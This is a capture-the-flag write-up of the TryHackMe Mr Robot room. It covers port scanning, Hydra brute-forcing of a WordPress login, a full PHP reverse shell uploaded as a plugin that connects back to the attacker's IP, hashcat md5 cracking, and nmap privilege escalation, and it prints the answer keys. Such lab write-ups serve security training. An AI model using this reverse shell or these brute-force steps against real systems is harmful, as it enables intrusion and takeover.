---
layout: post
title: THM — Mr Robot CTF
date: 2022-12-14 02:00:00 -500
categories: [TryHackMe]
tags: [Hydra]
---

<img src="/assets/images/THM/Mr%20Robot%20CTF/logo.jpg" width="20%">

***

<center><strong><font color="White">Based on the Mr. Robot show, can you root this box?</font></strong></center>

***

## <strong><font color="#34A5DA">Hack the machine</font></strong>

Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

***

First, let's try some basic nmap scan:

```
vladislav@Mac ~ % nmap -sV -sC 10.10.243.162
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-14 12:20 MSK
Nmap scan report for 10.10.243.162
Host is up (0.066s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.15 seconds
```

We see a website on port 80. So let's try to find some hidden subpages:

```
vladislav@Mac ~ % gobuster dir -u http://10.10.243.162 -w share/wordlists/dirs/directory-list-2.3-medium.txt -t 100 -o result_gobuster.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.243.162
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                share/wordlists/dirs/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/12/14 12:56:03 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://10.10.243.162/images/]
/blog                 (Status: 301) [Size: 234] [--> http://10.10.243.162/blog/]  
/sitemap              (Status: 200) [Size: 0]                                     
/video                (Status: 301) [Size: 235] [--> http://10.10.243.162/video/] 
/login                (Status: 302) [Size: 0] [--> http://10.10.243.162/wp-login.php]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.243.162/feed/]       
/0                    (Status: 301) [Size: 0] [--> http://10.10.243.162/0/]          
/feed                 (Status: 301) [Size: 0] [--> http://10.10.243.162/feed/]       
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.243.162/wp-content/]
/image                (Status: 301) [Size: 0] [--> http://10.10.243.162/image/]       
/admin                (Status: 301) [Size: 235] [--> http://10.10.243.162/admin/]     
/atom                 (Status: 301) [Size: 0] [--> http://10.10.243.162/feed/atom/]   
/audio                (Status: 301) [Size: 235] [--> http://10.10.243.162/audio/]     
/intro                (Status: 200) [Size: 516314]                                    
/css                  (Status: 301) [Size: 233] [--> http://10.10.243.162 css/]       
/wp-login             (Status: 200) [Size: 2671]                                      
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.243.162/feed/]        
/license              (Status: 200) [Size: 309]                                       
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.243.162/wp-includes/]
/js                   (Status: 301) [Size: 232] [--> http://10.10.243.162/js/]         
/Image                (Status: 301) [Size: 0] [--> http://10.10.243.162/Image/]        
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.243.162/feed/rdf/]     
/page1                (Status: 301) [Size: 0] [--> http://10.10.243.162/]              
/readme               (Status: 200) [Size: 64]                                         
/robots               (Status: 200) [Size: 41]
```

Going throught subpages that returned 200 we can find subpage `robots`. There we are listed some files:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

```shell
wget http://10.10.243.162/fsocity.dic
```


Going to `10.10.243.162/key-1-of-3.txt` we can find the first flag.

> What is key 1? `073403c8a58a1f80d943455fb30724b9`

Next we can find a `10.10.243.162/wp-login` subpage which contains a wordpress login page. 

Let's try to find login using found dictionary:. First, let’s intercept the login with Burp Suite:

```http
POST /wp-login.php HTTP/1.1
Host: 10.10.243.162
Content-Length: 100
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.243.162
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.243.162/wp-login
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: close

log=vlad&pwd=pass&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.243.162%2Fwp-admin%2F&testcookie=1
```

Now using hydra:

```shell
hydra -L fsocity.dic -p pass 10.10.243.162 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.175.84%2Fwp-admin%2F&testcookie=1:F=Invalid username"
```

```
vladislav@Mac ~ % hydra -L fsocity.dic -p pass 10.10.243.162 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.175.84%2Fwp-admin%2F&testcookie=1:F=Invalid username"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-14 13:14:42
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.243.162:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.175.84%2Fwp-admin%2F&testcookie=1:F=Invalid username
[80][http-post-form] host: 10.10.243.162   login: Elliot   password: pass
```

We got the username `Elliot`. Now let's bruteforce the password.

```shell
hydra -l Elliot -P fsocity.dic 10.10.243.162 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.175.84%2Fwp-admin%2F&testcookie=1:S=302"
```

Finally we bruteforced the pass: `ER28–0652`.

After logging and searching for some interesting we can find that we can upload plugins for Wordpress, so let's upload reverse shell this way:

```
<?php
/*
Plugin Name:  Reverse Shell
Plugin URI: http://shell.com
Description: gimme a shell
Version: 1.0
Author: me
Author URI: http://www.me.com
Text Domain: shell
Domain Path: /languages
*/
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.18.84.204';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

We can upload only zip files so we zip this file. Then we start a netcat listener:

```shell
netcat -lvp 444
```

After activating the plugin we get the reverse shell.

At `/home/robot` we can find two files:

```
daemon@linux:/home/robot$ ls
key-2-of-3.txt	password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b
```

It's pretty evident that this is login and some hashed password with md5. Using hashcat:
```shell
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

The cracked password is: `c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz`.

Now switching user to `robot` and reading file: `822c73956184f694993bede3eb39f959`

> What is key 2? `822c73956184f694993bede3eb39f959`


Moreover, we had to upgrade our shell using python:

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

Using LinEnum I found out that nmap is installed on this machine, so we can run the following code to get root shell:

```
nmap --interactive
!sh
```

> What is key 3? `04787ddef27c3dee1ee161b21670b4e4`